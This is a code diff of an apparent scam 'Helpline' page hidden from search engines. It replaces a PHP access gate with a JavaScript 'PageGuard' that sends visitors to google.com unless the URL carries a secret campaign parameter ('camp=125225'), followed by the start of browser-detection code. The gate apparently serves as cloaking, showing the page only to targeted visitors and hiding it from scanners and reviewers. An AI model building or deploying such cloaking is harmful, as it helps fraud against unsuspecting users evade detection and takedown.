@@ -1,65 +1,60 @@
-<?php
-
-class PageGuard {
-  private $expectedKey;
-  private $expectedValue;
-  private $redirectUrl;
-
-  public function __construct($key, $value, $url) {
-    $this->expectedKey = $key;
-    $this->expectedValue = $value;
-    $this->redirectUrl = $url;
-  }
-
-  public function getExpectedKey() {
-    return $this->expectedKey;
-  }
-
-  public function getExpectedValue() {
-    return $this->expectedValue;
-  }
-
-  public function setRedirectUrl($url) {
-    $this->redirectUrl = $url;
-  }
-
-  public function isParameterSet() {
-    return isset($_GET[$this->expectedKey]);
-  }
-
-  public function getParameterValue() {
-    return $_GET[$this->expectedKey] ?? null;
-  }
-
-  public function isValueCorrect() {
-    $value = $this->getParameterValue();
-    return $value === $this->expectedValue;
-  }
-
-  public function redirectTo() {
-    header("Location: " . $this->redirectUrl);
-    exit();
-  }
-
-  public function validate() {
-    if (!$this->isParameterSet() || !$this->isValueCorrect()) {
-      $this->redirectTo();
-    }
-  }
-
-  public function run() {
-    $this->validate();
-    echo "Validation Passed!";
-  }
-}
-
-$guard = new PageGuard('x9q2', 'p7g5s1', 'https://www.google.com/');
-$guard->run();
-?>
 <html xmlns="http:/www.w3.org/1999/xhtml">
 <head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="robots" content="noindex,nofollow">
 	<title>Helpline0d07</title>
+<script>
+    class PageGuard {
+        constructor(key, value, url) {
+            this.expectedKey = key;
+            this.expectedValue = value;
+            this.redirectUrl = url;
+        }
 
+        getExpectedKey() {
+            return this.expectedKey;
+        }
+
+        getExpectedValue() {
+            return this.expectedValue;
+        }
+
+        setRedirectUrl(url) {
+            this.redirectUrl = url;
+        }
+
+        isParameterSet() {
+            const params = new URLSearchParams(window.location.search);
+            return params.has(this.expectedKey);
+        }
+
+        getParameterValue() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(this.expectedKey);
+        }
+
+        isValueCorrect() {
+            const value = this.getParameterValue();
+            return value === this.expectedValue;
+        }
+
+        redirectTo() {
+            window.location.href = this.redirectUrl;
+        }
+
+        validate() {
+            if (!this.isParameterSet() || !this.isValueCorrect()) {
+                this.redirectTo();
+            }
+        }
+
+        run() {
+            this.validate();
+            console.log("Validation Passed!");
+        }
+    }
+
+    const guard = new PageGuard('camp', '125225', 'https://www.google.com/');
+    guard.run();
+</script>
 	<script type="text/javascript">
 	var isChromium = window.chrome,
     vendorName = window.navigator.vendor,
